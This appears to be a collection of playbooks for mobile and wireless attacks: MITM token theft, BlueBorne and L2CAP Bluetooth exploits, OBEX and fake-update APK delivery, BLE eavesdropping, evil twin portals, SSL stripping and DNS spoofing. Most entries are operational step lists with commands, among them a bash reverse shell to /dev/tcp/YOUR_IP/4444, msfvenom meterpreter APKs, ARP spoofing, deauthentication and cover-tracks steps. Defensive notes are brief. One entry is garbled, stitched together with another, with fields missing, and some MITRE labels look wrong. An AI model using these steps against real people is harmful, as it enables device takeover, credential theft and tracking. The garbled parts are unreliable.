## Token Logging via Network Intercept (MITM)

- **Attack Type**: Session Hijacking (Token Theft via Mobile Phishing)
- **Target**: Android Device on Wi-Fi or Mobile Browser
- **Vulnerability**: Lack of certificate pinning, unencrypted or weakly encrypted traffic, weak session control
- **MITRE**: T1557.002 – Man-in-the-Middle via ARP Spoofing
- **Impact**: Full session hijack, identity theft, unauthorized access
- **Tools**: Wireshark, Bettercap, SSLStrip, Kali Linux, Android Device (victim), Public Wi-Fi, Burp Suite, Root CA Certificate
- **Scenario**: The attacker performs a Man-in-the-Middle (MITM) attack by intercepting unencrypted or weakly encrypted HTTP/HTTPS traffic from a victim's mobile device. When the victim logs into a web service using mobile data or public Wi-Fi, the attacker captures session tokens from headers or cookies, which can then be replayed to hijack the session.
- **Attack Steps**: 1. Set up attacker laptop or VM: Install Kali Linux or Parrot OS. Ensure network adapter is set to NAT or bridged so you can interact with the victim's traffic. 2. Enable IP forwarding: Open terminal and run echo 1 > /proc/sys/net/ipv4/ip_forward. This allows your machine to forward packets as a router. 3. Use Bettercap for MITM: Run bettercap -iface wlan0 (replace wlan0 with your network interface). 4. Enable ARP spoofing: Inside Bettercap interactive shell, run: net.probe on set arp.spoof.targets <victim IP> arp.spoof on. This poisons the ARP table of victim, making attacker the gateway. 5. Enable HTTPS downgrade (optional) using http.proxy and https.proxy.sslstrip modules if victim app doesn't enforce HSTS. Run: set http.proxy.sslstrip true http.proxy on. 6. Install Burp Suite and set up proxy: In Burp, go to Proxy tab → Options → set to port 8080. Enable Intercept. 7. Install Burp's root CA on victim phone: Open phone browser and navigate to http://burp. Download and install CA certificate. Enable "Trust User Certificates" in developer options. Note: This works only on rooted Android or systems where user CA is honored. 8. Configure victim device to use your proxy: On victim phone, go to Wi-Fi settings → modify network → manual proxy → enter attacker IP and port 8080. 9. Launch Burp, capture login traffic: Victim opens a mobile browser or insecure app (that uses HTTP or weak HTTPS). When user logs in, session tokens appear in Cookie or Authorization headers. 10. Go to Burp → HTTP History tab: Click on each captured request. Identify session-related headers like Authorization: Bearer, session=, X-Auth-Token, etc. 11. Copy session token. Open Chrome on your system → go to target site → open DevTools → Application → Cookies → paste the stolen token. 12. Refresh the page → You're now logged in as the victim without username/password. 13. Alternatively, if app uses a token in URL (e.g., password reset, magic login), capture and replay entire URL.
- **Detection**: Monitor for strange IP sessions, duplicate tokens, public Wi-Fi session spikes
- **Solution**: Enforce HSTS, TLS 1.3, certificate pinning, token binding, VPNs
- **Tags**: #mitm #tokenhijack #sslstrip #mobilephishing

## BlueBorne RCE Attack (CVE-2017-0785 and others)

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others)
- **Target**: Android (pre-8.0), Linux Devices with BlueZ, IoT with Bluetooth
- **Vulnerability**: CVE-2017-0785 (SDP buffer overflow), CVE-2017-1000251, CVE-2017-8628
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: Full device compromise, remote code execution, persistence, lateral movement
- **Tools**: Linux OS (Kali), BlueBorne Proof-of-Concept, Python, Android device (unpatched), bdaddr tool, Bluetooth Adapter, GitHub PoC
- **Scenario**: An attacker exploits vulnerabilities in the Bluetooth stack (e.g., in Android's Bluetooth implementation, BlueZ on Linux) to perform Remote Code Execution (RCE) without user interaction. The victim only needs Bluetooth enabled and to be within range—no need to pair, click, or connect. This allows silent takeover of the device.
- **Attack Steps**: 1. Set up a Kali Linux machine (can be virtual or physical) with a Bluetooth adapter (lsusb to verify it's detected). Make sure Bluetooth is enabled via rfkill unblock bluetooth and hciconfig hci0 up. 2. Clone BlueBorne scanner and exploit repo: Run git clone https://github.com/Exploitables/BlueBorne-Exploits.git and cd BlueBorne-Exploits/. 3. Install dependencies: Use sudo apt install python3-pip and pip3 install pybluez. Also install libbluetooth-dev. 4. Enable L2CAP socket access: Make sure you're running Python scripts as root or with CAP_NET_RAW capabilities. You may use: sudo setcap cap_net_raw+eip $(readlink -f $(which python3)). 5. Scan for Bluetooth devices nearby: Use hcitool scan or bluetoothctl to get the MAC address of nearby Android devices. 6. Verify if target is vulnerable: Use blueborne-scanner.py script (from Armis repo): python3 blueborne-scanner.py hci0. This scans devices for CVE-2017-0785 and others. 7. Choose target MAC address from scan result (e.g., C8:69:CD:3A:42:55). 8. Launch the exploit: Use cve-2017-0785.py or respective CVE script from the repo: python3 cve-2017-0785.py <TARGET_MAC>. This sends a specially crafted SDP packet that overflows the buffer in the Bluetooth daemon. 9. Gain shell access (PoC may open reverse shell or crash the daemon): If successful, you can escalate to RCE via injected payloads or maintain persistence. 10. Verify control: Use injected payloads like opening reverse TCP connection to your machine: nc -lvp 4444. Modify the payload in exploit script to execute: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1. 11. You now have code execution on target device without it pairing or interacting.
- **Detection**: Monitor SDP traffic anomalies, audit hci0 daemon logs, look for L2CAP injection
- **Solution**: Patch OS to latest security level, disable Bluetooth if unused, segment Bluetooth stack
- **Tags**: #blueborne #cve20170785 #bluetoothrce #wirelessattack

## Bluetooth Unauthorized File Access (Obex Push Profile Abuse)

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others)
- **Target**: Android devices (older or misconfigured), IoT, Windows laptops
- **Vulnerability**: Lack of OBEX auth, missing confirmation, insecure pairing
- **MITRE**: T1205.001 – Traffic Transfer Tools
- **Impact**: Silent file delivery, malware install, social engineering
- **Tools**: Linux with BlueZ, obexftp, sdptool, Android Device (Bluetooth enabled), Python
- **Scenario**: The attacker abuses the OBEX Push Profile to send arbitrary files (malware, payloads, fake images) to a nearby mobile device. Some Android devices automatically accept or store files when Bluetooth is enabled, especially older or improperly configured devices, enabling silent data injection or social engineering.
- **Attack Steps**: 1. Install obexftp: On Kali or Ubuntu, run sudo apt install obexftp bluez bluez-tools. This allows Bluetooth-based file transfers using OBEX protocol. 2. Scan for nearby Bluetooth devices: Run hcitool scan or bluetoothctl to discover devices. Note the MAC address of the victim (e.g., 98:D3:31:F7:92:1B). 3. Verify OBEX Push Profile support: Use sdptool browse <MAC> to list supported Bluetooth profiles. Look for “OBEX Object Push”. 4. Create a malicious or fake file: For example, a fake Android app named Update.apk, or InstaPics.jpg.exe. You can use tools like msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -o Update.apk. 5. Send file using obexftp: Run the command obexftp --nopath --noconn --uuid none --bluetooth <MAC> --channel 9 --put Update.apk. If channel 9 fails, try 10, 12, or whatever sdptool reported for OBEX. 6. Observe file delivery: On some devices, the file is auto-accepted, or prompts with a misleading filename (like a “Photo”). Users unaware may install or open it. 7. Wait for victim to interact with file: If payloaded with a reverse shell, set up listener: msfconsole → use multi/handler → set payload → exploit. 8. Gain access: Once victim opens the file, connection is established back to attacker.
- **Detection**: Monitor OBEX traffic, review auto-download settings
- **Solution**: Disable OBEX Push or require manual confirmation
- **Tags**: #bluetooth #obex #unauthorizedfile #bluetoothabuse

## Bluetooth L2CAP Buffer Overflow (Android RCE)

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others)
- **Target**: Android (6.0 to 9.0), IoT
- **Vulnerability**: CVE-2020-0022 (L2CAP buffer overflow in bluedroid stack)
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: Full device takeover, persistent control, crash or RCE
- **Tools**: Kali Linux, BlueZ, Python, Bluetooth Adapter, Android device (unpatched), CVE-2020-0022 PoC
- **Scenario**: The attacker sends a specially crafted L2CAP packet to overflow the Bluetooth daemon memory of nearby Android devices. This causes Remote Code Execution (RCE) without any user interaction. The bug lies in how Android's Bluetooth stack (bluedroid) handles L2CAP length validation.
- **Attack Steps**: 1. Install required tools: On Kali or Linux, install BlueZ (sudo apt install bluez) and Python 3. 2. Clone PoC repo for CVE-2020-0022: git clone https://github.com/luanmonk/CVE-2020-0022. 3. Enter the exploit directory and review script: cd CVE-2020-0022 && nano poc.py. The script crafts malformed L2CAP packets. 4. Enable Bluetooth adapter: hciconfig hci0 up and ensure visibility with bluetoothctl. 5. Scan for vulnerable devices: hcitool scan to find nearby Android devices with Bluetooth on. 6. Modify target MAC in PoC: In the Python script, replace the target MAC with the victim’s device. 7. Run the exploit: sudo python3 poc.py. The payload triggers a heap buffer overflow in the victim’s bluedroid stack. 8. Observe result: On unpatched devices, this may crash Bluetooth, reboot system, or open shell (if payloaded). Combine with payload (e.g., reverse shell) for full RCE. 9. Optional: Modify payload to execute shell command, download malware, or open reverse TCP using custom crafted L2CAP extension. 10. Use msfconsole for listener: If using payload: use exploit/multi/handler, set correct LHOST/LPORT. When victim is compromised, shell is granted.
- **Detection**: Monitor kernel logs, crash reports, analyze malformed packets
- **Solution**: Patch OS, disable Bluetooth if not needed, HCI-level packet filtering
- **Tags**: #l2cap #bluetoothoverflow #androidrce

## Bluetooth MAC Tracking and Fingerprinting

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others)
- **Target**: All Bluetooth-enabled mobile and IoT devices
- **Vulnerability**: Unchanged MAC, weak MAC randomization, advertising beacons
- **MITRE**: T1422 – Broadcast Information Discovery
- **Impact**: Privacy breach, physical tracking, movement profiling
- **Tools**: Linux with BlueZ, btmon, l2ping, hcitool, btle-sniffer, Wireshark
- **Scenario**: The attacker scans and tracks Bluetooth MAC addresses over time to uniquely identify, fingerprint, and follow a target user or device. Many devices broadcast their Bluetooth MAC even when idle, leaking information like device type, OS, and behavior.
- **Attack Steps**: 1. Install BlueZ and tools: Use Kali or Ubuntu: sudo apt install bluez bluez-tools wireshark. 2. Enable Bluetooth adapter: Run hciconfig hci0 up and rfkill unblock bluetooth. 3. Start passive scan: Use hcitool lescan --duplicates or bluetoothctl scan on to discover advertising devices. Let it run for 10–30 mins. 4. Log MACs and timestamps: Save output to file: hcitool lescan > mac_log.txt. Include timestamps to correlate movement. 5. Run btmon: sudo btmon captures HCI events in real time and reveals manufacturer info from MAC prefix (first 3 bytes = vendor OUI). 6. Identify target devices: Match MAC to vendor (e.g., Apple, Samsung) using IEEE OUI list. Look at advertising name (DeviceName, UUID). 7. Fingerprint behavior: Track signal strength (RSSI) and reappearance patterns to determine movement, device location, even person identity over time. 8. Advanced step: Use BLE sniffers like Ubertooth One or Nordic sniffer to capture precise packet data, even when MAC randomization is enabled. 9. Correlate MACs with physical user: Watch patterns of presence near cafes, schools, offices to build movement profile. 10. Build full fingerprinting profile: Combine MACs, device name, UUID, frequency to uniquely track user across places.
- **Detection**: Detect repeated MAC queries, check Bluetooth activity logs
- **Solution**: Enforce MAC randomization, limit advertising, Bluetooth hygiene
- **Tags**: #bluetoothtracking #macspoof #privacy

## BLE Hijacking via Passive Eavesdropping Attack

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others) → Bluetooth Smart (BLE) Hijacking / Eavesdropping
- **Target**: BLE-enabled mobile/IoT devices (e.g., smartwatches, fitness bands, BLE peripherals)
- **Vulnerability**: BLE pairing without authentication or using "Just Works" (Unauthenticated LE Legacy Pairing)
- **MITRE**: T1557.003 – Adversary-in-the-Middle
- **Impact**: Theft of personal data, session hijacking, unauthorized control of device functions, BLE command injection
- **Tools**: Ubertooth One, Wireshark with BLE plugin, hcitool, hcxdumptool, Linux/macOS, vulnerable BLE device (e.g., fitness tracker), GATTacker, BLEAH, BLE Suite
- **Scenario**: An attacker within Bluetooth range performs passive eavesdropping during the BLE pairing process using vulnerable BLE devices (e.g., fitness bands, IoT devices, mobile phones). If the pairing method lacks encryption or uses "Just Works", the attacker can capture the Long Term Key (LTK) or session keys and later decrypt BLE traffic or hijack the session, leading to data theft or command injection.
- **Attack Steps**: 1. Prepare the Setup: Install Wireshark, BLE plugins, and set up Ubertooth One or compatible Bluetooth sniffer on a Linux or macOS system. 2. Identify the Target: Use hcitool lescan or tools like BLEAH to discover nearby BLE-enabled devices (e.g., wearable devices or IoT gadgets). 3. Start Sniffing BLE Traffic: With Ubertooth One, run BLE sniffing commands and capture advertisements and connection requests. Example: ubertooth-btle -f -c or capture PCAPs via Wireshark. 4. Detect Insecure Pairing Method: Identify if the BLE pairing is using "Just Works" or unauthenticated LE Legacy pairing by analyzing the pairing request packets. 5. Intercept the Key Exchange: During initial pairing, capture LTK, STK (Short Term Key), or session keys. This is feasible if encryption is weak or missing. 6. Replay or Decrypt Communication: Once keys are captured, decrypt BLE packets to view transmitted data (e.g., health info, commands). 7. Hijack BLE Session (Optional): Using tools like GATTacker, inject malicious GATT commands to modify or read data from the BLE device. 8. Persistent Surveillance (Optional): Use passive sniffing to monitor BLE traffic indefinitely, especially if the device reuses keys or lacks re-pairing mechanisms.
- **Detection**: Analyze pairing requests, inspect entropy in session key exchanges, monitor GATT activity patterns in BLE traffic
- **Solution**: Use authenticated pairing modes (e.g., Passkey Entry or Numeric Comparison), update firmware, enforce secure BLE protocols (LE Secure Connections), disable pairing in production devices
- **Tags**: #BLE #Hijacking #Eavesdropping #MobileSecurity #BlueBorne #BTLE #CVE #BluetoothHack

## BLE MITM via GATT Injection

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others) → BLE MITM via GATT Injection
- **Target**: BLE-enabled mobile/IoT devices (e.g., fitness trackers, smart bulbs)
- **Vulnerability**: Insecure pairing + unencrypted GATT + lack of authentication in characteristics
- **MITRE**: T1557.003 – Adversary-in-the-Middle
- **Impact**: Device hijack, data exfiltration, unauthorized control, integrity tampering
- **Tools**: Linux/macOS, two Bluetooth adapters, GATTacker, hcitool, gatttool, BLEAH, nRF Connect app, BLE device, smartphone
- **Scenario**: An attacker performs a Man-in-the-Middle (MITM) attack between a smartphone and a BLE peripheral (e.g., smart bulb, fitness tracker), intercepting and modifying Generic Attribute Profile (GATT) commands. This allows full manipulation of BLE data—reading private data or sending unauthorized control commands. The attack targets insecure BLE pairing methods and misconfigured GATT permissions.
- **Attack Steps**: 1. Prepare Dual Bluetooth Setup: On a Linux system, attach two Bluetooth dongles. One will impersonate the peripheral, the other acts as the host. 2. Install GATTacker: Clone and set up the GATTacker framework: git clone https://github.com/securing/gattacker && cd gattacker && npm install 3. Scan and Clone Target Peripheral: Use node clone.js to scan for the BLE device (e.g., fitness band) and clone its services/characteristics. GATTacker will save a JSON file representing the device. 4. Start MITM Proxy: Start GATT proxy with: node mitm.js using the cloned device file. This puts the attacker in the middle between smartphone and BLE device. 5. Connect Victim App/Device: Let the victim app on the phone connect to the spoofed (cloned) BLE device. All traffic is now intercepted. 6. Inject GATT Commands: Modify intercepted read/write requests. Example: when fitness tracker sends heart rate = 80 bpm, modify it to 120 bpm. Or inject unauthorized commands to turn off/on a smart bulb. 7. Log or Store Stolen Data: Store GATT values being read (health info, commands, etc.) for later analysis. 8. Clean Exit: Stop MITM proxy and restore network; cover tracks by resetting Bluetooth adapter.
- **Detection**: Unusual GATT request/response patterns, device behavior anomalies, Bluetooth traffic analysis
- **Solution**: Enforce LE Secure Connections, use encrypted authenticated pairing (e.g., Numeric Comparison), restrict GATT permissions (read/write with auth)
- **Tags**: #BLE #MITM #GATT #GATTInjection #BluetoothHack #MobileSecurity

## iOS Bluetooth Pairing Leak (CVE‑2020‑9770)

- **Attack Type**: Bluetooth Exploits (BlueBorne & Others) → iOS Bluetooth Pairing Leak
- **Target**: iPhones/iPads with iOS < 13.4, paired BLE accessories
- **Vulnerability**: CVE‑2020‑9770 – flawed pairing logic allows key disclosure
- **MITRE**: T1557.003 – Adversary-in-the-Middle
- **Impact**: Privacy leakage, decrypted BLE traffic, impersonation of trusted devices
- **Tools**: Linux/macOS, Wireshark with BLE plugin, hcitool, Ubertooth One, iOS device (<13.4), BLE peripheral, python, hcxdumptool
- **Scenario**: A vulnerability in iOS versions < 13.4 allows pairing key leaks during Bluetooth connections. An attacker near the victim can sniff the pairing process (especially with BLE devices) and derive the LTK or encryption keys. This permits future decryption of BLE traffic or impersonation of devices, even without user approval.
- **Attack Steps**: 1. Setup Sniffing Environment: Connect Ubertooth One or similar BLE sniffing tool to your Linux/macOS system. Install Wireshark with BLE plugins. 2. Scan for BLE Devices: Use hcitool lescan to find the BLE devices around you. Identify the device pairing with an iOS device (e.g., BLE headphones, smart tracker). 3. Start BLE Sniffing: Run Ubertooth with ubertooth-btle -f to follow the connection. Simultaneously start Wireshark to capture BLE pairing packets. 4. Monitor the iOS Pairing Process: Wait for the BLE device and iPhone to start pairing. In vulnerable iOS (<13.4), pairing data is exposed during "Just Works" mode. 5. Capture Pairing Key Exchange: Use Wireshark to capture the pairing request/response packets. Note the Temporary Key (TK) and confirm if it's all-zero (a known vulnerability). 6. Derive LTK/STK: Using Python or BLE toolkits, calculate the STK from the captured TK/Random values and extract the LTK. 7. Use Derived Key to Decrypt Traffic: Later BLE communications (health data, audio control) can now be decrypted using this key, even without ongoing pairing. 8. Optional – Impersonate BLE Device: With LTK known, use GATT spoofing to impersonate the BLE peripheral or replay commands. 9. Cleanup: Stop sniffer tools and analyze decrypted traffic in Wireshark.
- **Detection**: Monitor for unencrypted key exchange, verify TK entropy during BLE pairing
- **Solution**: Update to iOS ≥ 13.4, avoid “Just Works” pairing, enable LE Secure Connections, re-pair devices with secure methods
- **Tags**: #CVE20209770 #BLE #pairing #iOS #BluetoothLeak #MobileSecurity

## Evil Twin with Captive Portal (Credential Theft)

- **Attack Type**: Wi-Fi Exploits (Rogue AP, Evil Twin) – Mobile Focus → Evil Twin with Captive Portal
- **Target**: Mobile phones/laptops using public Wi-Fi
- **Vulnerability**: Open Wi-Fi, weak certificate validation, trusting SSIDs
- **MITRE**: T1557.001 – Adversary-in-the-Middle
- **Impact**: Theft of login credentials, unauthorized access, further phishing or account hijacking
- **Tools**: Kali Linux, Wi-Fi USB adapter (monitor/AP mode), hostapd, dnsmasq, iptables, apache2 or lighttpd, custom HTML/PHP portal, sslstrip, ettercap
- **Scenario**: An attacker sets up a fake Wi-Fi hotspot with the same SSID as a legitimate network (e.g., "Free_Airport_WiFi"). Users connect to the fake AP and are redirected to a captive portal that mimics a login page. Credentials entered are logged and harvested by the attacker.
- **Attack Steps**: 1. Enable Monitor Mode: airmon-ng start wlan02. Setup Fake AP (Evil Twin): Configure hostapd.conf with same SSID as real network and launch: hostapd hostapd.conf3. Create DHCP/DNS Redirect: Configure dnsmasq.conf to give out IPs and redirect all DNS to attacker IP.4. Redirect HTTP/HTTPS: Use iptables to redirect traffic to port 80. Enable sslstrip to downgrade HTTPS.5. Serve Captive Portal: Place a fake login page at /var/www/html/index.php (e.g., corporate login mimic). Log credentials via PHP form.6. Deauth Real Network: Use aireplay-ng --deauth 10 -a <BSSID> to kick users and force them to connect to Evil Twin.7. Capture Credentials: Once users connect, the fake login page grabs credentials and stores them in a file (e.g., creds.txt).8. Clean Up: Shut down services and restore IP tables: iptables -F, airmon-ng stop wlan0mon.
- **Detection**: Duplicate SSID/BSSID detection, unexpected captive portal, rogue AP monitoring tools
- **Solution**: Enforce HTTPS with cert pinning, avoid open networks, use VPNs, deploy WPA2 Enterprise
- **Tags**: #EvilTwin #WiFiHack #CaptivePortal #MobileSecurity #Phishing

## Evil Twin with Captive Portal (Credential Theft)

- **Attack Type**: Rogue AP, Evil Twin
- **Target**: Mobile Phones
- **Vulnerability**: Lack of Wi-Fi authentication, auto-connect behavior
- **MITRE**: T1557.002 (Adversary-in-the-Middle: Wireless)
- **Impact**: Credential Theft, Session Hijack Risk
- **Tools**: Airbase-ng, Bettercap, DnsChef, Captive-Portal, Responder, Laptop with Wi-Fi adapter (monitor mode capable)
- **Scenario**: An attacker sets up a fake Wi-Fi access point (Evil Twin) mimicking a real public Wi-Fi (e.g., a coffee shop or airport). Once a mobile user connects, they are redirected to a fake login page (Captive Portal) resembling a legitimate login portal. When users enter credentials (e.g., email, social logins), the attacker harvests them.
- **Attack Steps**: 1. Choose a location with public Wi-Fi (e.g., Starbucks). 2. Use airmon-ng to enable monitor mode on your wireless card: airmon-ng start wlan0 3. Launch an Evil Twin AP using airbase-ng: airbase-ng -e "Starbucks_WiFi" -c 6 wlan0mon 4. Enable internet connection sharing from host system (if needed). 5. Set up dnsmasq or DnsChef to redirect all DNS requests to attacker's IP. 6. Host a fake Captive Portal using Python HTTP server or Apache/Nginx. Page should mimic login screens (e.g., Google, Facebook, or public Wi-Fi login). 7. Use a keylogger or backend script to log submitted credentials. 8. Wait for mobile users to auto-connect to your rogue AP. 9. As they access internet, they are redirected to your captive portal. 10. User submits credentials, which get stored on attacker's machine.
- **Detection**: Monitor unknown SSIDs with tools like Wireshark, kismet, mobile warnings
- **Solution**: Disable auto-connect, verify captive portals, use VPN
- **Tags**: Evil Twin, Captive Portal, Wi-Fi Phishing, Mobile, Man-in-the-Middle

## Session Hijacking Over Open Wi-Fi (Sidejacking)

- **Attack Type**: Wi-Fi Sniffing, Session Hijacking
- **Target**: Mobile Phones
- **Vulnerability**: Unencrypted traffic, session cookies over HTTP
- **MITRE**: T1557.001 (Adversary-in-the-Middle: ARP Spoofing)
- **Impact**: Unauthorized Account Access, Identity Theft
- **Tools**: Bettercap, Ettercap, Wireshark, Ferret & Hamster, Mobile with open Wi-Fi
- **Scenario**: On an open (unencrypted) Wi-Fi network, an attacker captures session cookies from mobile app or browser traffic that lack HTTPS. Using tools like Wireshark or Bettercap, they hijack sessions and gain unauthorized access to the victim's account (e.g., social media, email).
- **Attack Steps**: 1. Connect to the same public open Wi-Fi as the target (e.g., airport, café). 2. Launch bettercap or ettercap to start packet sniffing: bettercap -iface wlan0 3. Enable sniffing modules: net.sniff on 4. Target all hosts on the network: net.probe on 5. Use http.proxy or https.proxy modules to intercept cookie-based sessions. 6. Capture and extract session cookies using packet inspection (Wireshark or ferret). 7. Import stolen session cookie into browser using EditThisCookie extension. 8. Access the victim's session as if authenticated (e.g., Gmail, Facebook). Note: Most modern apps use HTTPS, but older or custom apps may still leak credentials.
- **Detection**: Monitor ARP poisoning, check for duplicate IPs
- **Solution**: Enforce HTTPS-only apps/sites, use VPN on public Wi-Fi
- **Tags**: Sidejacking, Session Cookie Theft, Mobile, Open Wi-Fi, MITM

## Fake App Update via Open Wi-Fi (APK Injection)

- **Attack Type**: Rogue AP + APK Malware Injection
- **Target**: Mobile Phones
- **Vulnerability**: Lack of certificate pinning, insecure updates
- **MITRE**: T1476 (Deliver Malicious App via MITM)
- **Impact**: Remote Device Control, Data Theft, Keylogging
- **Tools**: EvilAP, Ettercap, Bettercap, mitmproxy, APKTool, msfvenom, Burp Suite, Fake APK
- **Scenario**: An attacker creates a rogue Wi-Fi hotspot that mimics a trusted open network. When a mobile device connects, the attacker intercepts HTTP traffic and injects a malicious APK file disguised as a legitimate app update (e.g., WhatsApp, Google Chrome). Unsuspecting users download and install it, resulting in full device compromise.
- **Attack Steps**: 1. Create a rogue access point with name similar to trusted network (e.g., Free_Public_WiFi). 2. Use airbase-ng or hostapd to launch fake AP. 3. Configure dnsmasq to redirect all DNS to attacker’s IP. 4. Intercept HTTP requests with mitmproxy or Burp Suite. 5. Replace original app download links (e.g., from WhatsApp site) with links to malicious APK. 6. Create malicious APK using msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o update.apk 7. Sign APK to avoid installation warning using jarsigner or apktool. 8. Host APK on local server and inject URL into intercepted HTTP response. 9. When the user tries to update the app, they are served the malicious version. 10. Once installed, the attacker gains remote access to the device.
- **Detection**: Monitor unknown APKs, validate update sources
- **Solution**: Enforce HTTPS updates, use Google Play only, no sideloading
- **Tags**: APK Injection, Rogue AP, Mobile Malware, Fake Update, MITM

## Man-in-the-Middle with SSL Stripping

- **Attack Type**: Rogue AP, SSL Strip
- **Target**: Mobile Phones
- **Vulnerability**: Lack of HTTPS enforcement, auto-connect behavior
- **MITRE**: T1557.002 (MitM: Wireless) + T1185 (Browser Session Hijacking)
- **Impact**: Credential theft, session token interception
- **Tools**: airbase-ng, sslstrip, iptables, dnsmasq, Wireshark, Linux machine with wireless adapter
- **Scenario**: An attacker sets up a rogue Wi-Fi access point (Evil Twin) and performs a MitM attack. By using SSL stripping tools, the attacker downgrades HTTPS traffic to HTTP, capturing login credentials and sensitive data from mobile browsers that lack HTTPS enforcement.
- **Attack Steps**: 1. Set Wi-Fi adapter to monitor mode: airmon-ng start wlan0 2. Launch Evil Twin AP with airbase-ng -e "FreeWiFi" -c 6 wlan0mon 3. Set up IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward 4. Redirect all port 80 traffic to port 10000 (sslstrip): iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 5. Start sslstrip: sslstrip -l 10000 -w ssl_log.txt 6. Set up DHCP/DNS with dnsmasq to assign IP and redirect DNS queries. 7. Wait for victim’s mobile to connect and browse HTTPS websites (e.g., Facebook, banking site). 8. Observe that sslstrip downgrades HTTPS to HTTP, intercepting credentials as plain text. 9. Review ssl_log.txt to view captured POST data, session tokens, credentials.
- **Detection**: Use HTTPS-only browser plugins, monitor HSTS headers
- **Solution**: Use VPN, enable HTTPS-only mode, public key pinning
- **Tags**: SSL Stripping, Evil Twin, Mobile MitM, Wi-Fi, HTTPS Downgrade

## Malicious DNS Spoofing (Fake App / Site Redirection)

- **Attack Type**: DNS Spoofing, Rogue AP
- **Target**: Mobile Phones
- **Vulnerability**: Insecure DNS resolution, no DNSSEC, open Wi-Fi
- **MITRE**: T1557.001 (DNS Spoofing) + T1204.002 (Malicious App Install)
- **Impact**: App compromise, credential theft, full remote access
- **Tools**: airbase-ng, dnsmasq, ettercap, responder, apache2, malicious APK, msfvenom, hostapd
- **Scenario**: Attacker sets up a rogue Wi-Fi AP and uses DNS spoofing to redirect legitimate requests (e.g., play.google.com, bank.com) to attacker-controlled servers hosting malicious APKs or phishing pages. Mobile users are tricked into downloading fake apps or entering credentials.
- **Attack Steps**: 1. Enable monitor mode: airmon-ng start wlan0 2. Launch rogue AP using airbase-ng -e "Cafe_WiFi" or hostapd 3. Install and configure dnsmasq: Add entries like address=/bank.com/192.168.1.1 to redirect DNS 4. Launch local web server (Apache/NGINX) and host cloned website or fake APK. 5. Optionally inject download links to malicious APK (msfvenom generated) via JavaScript or MITM. 6. Use Ettercap or Responder to monitor and capture credential POSTs. 7. When user types bank.com, they are redirected to your fake clone. 8. On the site, users either enter credentials (phished) or download and install the trojanized APK. 9. Attacker gets full access via reverse shell or stolen credentials.

- **Solution**: Use secure DNS (DoH/DoT), app store verification, avoid APK sideloading
- **Tags**: DNS Spoofing, Fake App, Evil Twin, Mobile Redirect

## App API Traffic Interception (JWT, Tokens, Location)

- **Attack Type**: API MITM over Rogue Wi-Fi
- **Target**: Mobile App (Android/iOS)
- **Vulnerability**: No TLS, Insecure APIs, Poor token handling
- **MITRE**: T1557.002 + T1529 (API Abuse), T1040 (Network Sniffing)
- **Impact**: Token theft, unauthorized access, GPS spoofing
- **Tools**: Burp Suite, mitmproxy, Bettercap, Wireshark, Frida, Android Emulator, sslstrip, hostapd
- **Scenario**: An attacker on a rogue Wi-Fi intercepts traffic from mobile apps to APIs (over HTTP or improperly configured HTTPS). If JWTs, OAuth tokens, or location data is unencrypted or improperly signed, the attacker can hijack sessions, impersonate users, or track them.
- **Attack Steps**: 1. Set up rogue AP (hostapd or airbase-ng) with a legit name (e.g., AirportFreeWiFi). 2. Enable IP forwarding and DNS redirection. 3. Launch mitmproxy or Burp Suite in transparent proxy mode. 4. Install custom CA cert on test mobile device to intercept HTTPS (Burp CA cert). 5. Mobile apps route API traffic through proxy (either HTTP or TLS-decrypted HTTPS). 6. Use Burp or mitmproxy to inspect API headers, especially Authorization: Bearer <token>, JWT, Device-ID, or location data in payload. 7. Extract token, replay or modify API requests to access victim data. 8. Optionally modify API response or inject scripts (if app doesn’t validate response hash). 9. Replay location update to simulate GPS spoofing or session hijacking. 10. Optionally script token abuse via Postman or curl.
- **Detection**: Monitor API usage anomalies, audit network logs
- **Solution**: Use HSTS, token expiration, secure API design, pin CA cert
- **Tags**: API Interception, JWT Theft, OAuth MITM, Mobile Apps

## APK Delivery via Fake Play Store or Popups

- **Attack Type**: Rogue AP + APK Phishing

- **Vulnerability**: Untrusted APKs, DNS spoofing, poor UX security

- **Scenario**: An attacker sets up a rogue Wi-Fi access point and uses fake Play Store interfaces or malicious popups injected via DNS spoofing or HTTP injection. Unsuspecting users are tricked into downloading malicious APKs disguised as app updates or promotions.

Configure dnsmasq to redirect DNS queries for play.google.com to attacker IP: address=/play.google.com/192.168.1.1 4. Clone the Google Play Store UI using HTTrack or SocialFish, modify it to display update prompts for popular apps. 5. Generate a malicious APK using msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o update.apk 6. Host the APK on Apache server: cp update.apk /var/www/html 7. Set up DHCP and DNS using dnsmasq to provide IP and redirect all domains to attacker-controlled IP. 3. Host a drive-by payload page with JavaScript auto-download behavior on Apache/Nginx: index.html triggers download of malicious APK. 4. Generate payload using msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o trojan.apk 5. Host this payload on the web server: mv trojan.apk /var/www/html 6. Use qrencode to generate QR code: qrencode -o wifi_qr.png "WIFI:T:WPA;S:Cafe_WiFi_Plus;P:password123;;" 7. Print or display the QR in a public area with a label like "Scan for Free Wi-Fi" 8. Victim scans QR → connects to rogue AP → visits a page → automatic download of trojan APK or redirect to fake Google Play/phishing. 9. If APK is installed, attacker gains full access. If not, phishing data may still be harvested.
- **Detection**: Monitor auto-downloads, analyze QR payloads, browser logs
- **Solution**: Train users to verify networks, enforce QR scan policies, disable auto-connect
- **Tags**: QR Wi-Fi, Drive-By Download, APK Exploit, Mobile Rogue AP

## Power Analysis Attack (App Inference via Power Consumption)

- **Attack Type**: Side-Channel via Power Pattern Analysis
- **Target**: Mobile Devices (Android/iOS)
- **Vulnerability**: Physical access + charging port manipulation, power leakage
- **MITRE**: T1200 (Hardware Additions), T1512 (Video/Power Side-Channel)
